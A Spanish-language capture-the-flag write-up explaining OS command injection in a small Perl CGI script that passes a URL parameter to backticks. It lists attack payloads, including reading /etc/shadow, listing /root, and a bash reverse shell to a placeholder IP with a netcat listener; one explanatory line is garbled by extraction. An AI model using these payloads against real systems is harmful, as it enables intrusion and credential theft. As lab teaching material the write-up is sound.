Level04 Os command Injection
cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
 	 $y = $_[0];
 	print `echo $y 2>&1`;
}
x(param("x"));
En Perl, el uso de backticks (`) o el operador qx{} es una llamada directa al sistema que invoca una subshell (normalmente /bin/sh).
¿Cómo funciona?
Cuando Perl llega a la línea:
print echo y2>1`;`Loquehaceestomarelcontenidodelavariable`y`, concatenarlo con la cadena y pasarle el comando completo al sistema operativo para que lo ejecute.
Analisis del codigo : 
Es un CGI en perl, accesible por web
http://localhost:4747/?x=algo
Toma el parámetro x de la URL
param("x")
Lo pasa directamente a una función
print `echo $y 2>&1`;
Command injection
El script no limpia la variable $y, se puede usar metacaracteres de la shell para terminar el comando echo y empezar uno nuevo.
Si el parámetro x (que se convierte en $y) es: ; whoami
El comando final que ejecuta el sistema es: echo ; whoami 2>&1

Tests de explotación (Pruebas de concepto)
El script corre con privilegios SUID, puedes probar estas cargas útiles (payloads) en el parámetro x para confirmar la ejecución:
Verificar identidad: ?x=;id
(Si el SUID funciona, verás uid=0(root) o el usuario propietario).
Listar archivos protegidos: ?x=;ls -la /root
Leer el archivo de passwords: ?x=;cat /etc/shadow
Obtener una Reverse Shell:  ?x=;bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1 
nc -lvnp 4444
curl "http://localhost:4747/?x=hello;id"
NB: El; no llega limpio al script Perl, CGI interpreta/parsing de parámetros el shell nunca ve el;
En HTTP, los caracteres especiales hay que codificarlos. (URL ENCODING)
curl  “http://localhost:4747/?x=%3Bgetflag”

